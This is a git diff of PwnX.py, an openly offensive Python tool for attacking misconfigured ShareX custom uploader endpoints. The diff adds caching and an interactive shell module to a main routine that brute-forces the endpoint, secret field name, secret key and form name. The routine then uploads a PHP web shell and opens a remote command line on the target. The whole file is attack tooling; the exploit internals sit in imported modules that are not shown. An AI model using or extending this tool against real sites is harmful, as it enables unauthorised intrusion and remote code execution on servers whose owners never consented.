@@ -1,9 +1,8 @@
 # Title: PwnX.py, formerly known as VulnX
 # Author: cs (@KaliLincox on Twitter)
-# Date: 03/07/2020, updated 26/02/2021
+# Date: 03/07/2020, remastered 26/02/2021
 # Description: Pwn misconfigured sites running ShareX custom image uploader API through RFI -> RCE.
 
-import colorama
 import argparse
 import sys
 import os
@@ -13,10 +12,13 @@ from core.exploit import Exploit
 from core.banner import Banner
 from core.logger import Logger
 from core.brute import Brute
+from core.cache import Cache
+from core.shell import Shell
 
 
 def main():
     if os.name == 'nt':
+        import colorama
         colorama.init(convert=True)
 
     Banner.print()
@@ -28,6 +30,7 @@ def main():
     parser.add_argument('-s', '--secret', help='sharex secret key', dest='secret', metavar='')
     parser.add_argument('--form-name', help='multipart file form name', dest='form_name', metavar='', default='sharex')
     parser.add_argument('--field-name', help='sharex secret key post data field name', dest='field_name', metavar='', default='secret')
+    parser.add_argument('--no-cache', help='disable cache', dest='cache_enabled', action='store_false')
 
     mandatory_group = parser.add_argument_group('mandatory arguments')
     mandatory_group.add_argument('-u', '--url', help='target url', dest='url', metavar='', required=True)
@@ -58,54 +61,63 @@ def main():
         secret = args.secret
         form_name = args.form_name
 
-        if args.brute_endpoint:
-            if args.verbose:
-                Logger.info('brute forcing endpoint...')
+        cache_data = Cache.get(url) if args.cache_enabled else None
 
-            url = Brute.endpoint(url)
-
-            if url is None:
-                Logger.error('endpoint not found')
-
-            Logger.success(f'endpoint found: \x1b[35m{url}')
-
-        if Brute.is_required(url): # check if it's necessary to brute force field name and secret key
-            if args.brute_field:
+        if cache_data is None:
+            if args.brute_endpoint:
                 if args.verbose:
-                    Logger.info('brute forcing secret key field name...')
+                    Logger.info('brute forcing endpoint...')
 
-                field_name = Brute.field_name(url)
+                url = Brute.endpoint(url)
 
-                if field_name is None:
-                    Logger.error('field name not found')
+                if url is None:
+                    Logger.error('endpoint not found')
 
-                Logger.success(f'field name found: \x1b[35m{field_name}')
+                Logger.success(f'endpoint found: \x1b[95m{url}')
 
-            if args.brute_secret:
+            if Brute.is_required(url):  # checks if it's necessary to brute force field name and secret key
+                if args.brute_field:
+                    if args.verbose:
+                        Logger.info('brute forcing secret key field name...')
+
+                    field_name = Brute.field_name(url)
+
+                    if field_name is None:
+                        Logger.error('field name not found')
+
+                    Logger.success(f'field name found: \x1b[95m{field_name}')
+
+                if args.brute_secret:
+                    if args.verbose:
+                        Logger.info('brute forcing secret key...')
+
+                    secret = Brute.secret(url, field_name)
+
+                    if secret is None:
+                        Logger.error('secret not found')
+
+                    Logger.success(f'secret found: \x1b[95m{secret}')
+
+            if args.brute_form:
                 if args.verbose:
-                    Logger.info('brute forcing secret key...')
+                    Logger.info('brute forcing multipart form name...')
 
-                secret = Brute.secret(url, field_name)
+                form_name = Brute.form_name(url, secret, field_name)
 
-                if secret is None:
-                    Logger.error('secret not found')
+                if form_name is None:
+                    Logger.error('form name not found')
 
-                Logger.success(f'secret found: \x1b[35m{secret}')
+                Logger.success(f'form name found: \x1b[95m{form_name}')
 
-        if args.brute_form:
             if args.verbose:
-                Logger.info('brute forcing multipart form name...')
+                Logger.info('attempting to upload php web shell...')
 
-            form_name = Brute.form_name(url, secret, field_name)
+            shell_url = Exploit.upload_shell(url, form_name, secret, field_name, args.verbose, args.cache_enabled)  # program will exit if an error occurs (shell_url cannot be None)
+        else:
+            Logger.info('shell url fetched from cache')
+            shell_url = cache_data['shell_url']
 
-            if form_name is None:
-                Logger.error('form name not found')
-
-            Logger.success(f'form name found: \x1b[35m{form_name}')
-
-        Logger.info('attempting to upload php web shell...')
-
-        Exploit.upload_shell(url, form_name, secret, field_name, args.verbose)
+        Shell.command_line(shell_url)
 
     except Exception as e:
         Logger.error(f'an error occurred while attempting to upload shell to target: \x1b[95m{e}')
